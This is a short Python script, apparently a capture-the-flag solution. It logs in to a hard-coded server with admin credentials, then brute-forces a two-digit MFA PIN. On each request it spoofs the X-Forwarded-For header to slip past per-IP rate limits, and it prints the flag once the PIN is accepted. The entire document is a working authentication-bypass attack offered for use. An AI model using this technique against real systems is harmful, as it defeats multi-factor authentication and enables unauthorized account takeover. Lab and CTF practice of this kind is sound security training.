import requests
base='http://41.111.227.16:5005'
s=requests.Session()

login=s.post(base+'/api/login',json={
 'email':'admin@corpdocs.local',
 'password':'SuperSecretPassword2026!'
},timeout=10)
print('login:', login.status_code, login.text.strip())

for i in range(100):
 pin=f'{i:02d}'
 xff=f'13.37.0.{i+1}' 
 r=s.post(base+'/api/mfa_verify',json={'pin':pin},headers={'X-Forwarded-For':xff},timeout=10)
 data=r.json()
 if data.get('status')=='success':
     print(pin)
     print(data.get('flag'))
     break
